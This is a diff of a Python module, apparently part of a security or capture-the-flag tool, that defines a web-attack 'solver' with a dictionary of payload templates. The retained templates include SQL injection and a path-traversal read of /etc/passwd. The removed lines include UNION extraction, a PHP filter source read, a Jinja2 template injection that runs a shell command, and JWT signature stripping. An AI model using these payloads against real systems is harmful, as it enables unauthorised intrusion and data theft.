@@ -3,30 +3,34 @@ Bounded Context: Web Domain Solver
 Responsabilidade Única (SRP): Templates e ataques voltados a aplicações Web.
 """
 from typing import Dict, Any
+from .base import BaseDomainSolver
+from .registry import register_solver
+from ..dtos.domain_dtos import AnalysisRequest, DomainAnalysisReport
 
-class WebDomainSolver:
-    """Solver especializado para segurança de aplicações Web (SQLi, LFI, SSTI, XXE, JWT, SSRF)."""
+@register_solver("web")
+class WebDomainSolver(BaseDomainSolver):
+    """Solver especializado para segurança de aplicações Web."""
+
+    @property
+    def domain_type(self) -> str:
+        return "web"
 
     def get_templates(self) -> Dict[str, Any]:
         return {
             "sqli_union": {
                 "name": "SQL Injection — UNION",
                 "detect": "' OR 1=1--",
-                "columns": "' ORDER BY N--",
-                "extract": "' UNION SELECT 1,2,3--",
             },
             "lfi": {
                 "name": "Local File Inclusion",
                 "basic": "../../../../etc/passwd",
-                "php_filter": "php://filter/convert.base64-encode/resource=index.php",
-            },
-            "ssti": {
-                "name": "Server-Side Template Injection",
-                "detect": "{{7*7}} → 49",
-                "jinja2": "{{lipsum.__globals__['os'].popen('id').read()}}",
-            },
-            "jwt": {
-                "name": "JWT Attacks",
-                "none_algorithm": "Change alg to 'none', remove signature",
             },
         }
+
+    def analyze(self, request: AnalysisRequest) -> DomainAnalysisReport:
+        return DomainAnalysisReport(
+            domain=self.domain_type,
+            success=True,
+            observations=[self.get_templates()],
+            metadata={"target": request.target_resource}
+        )
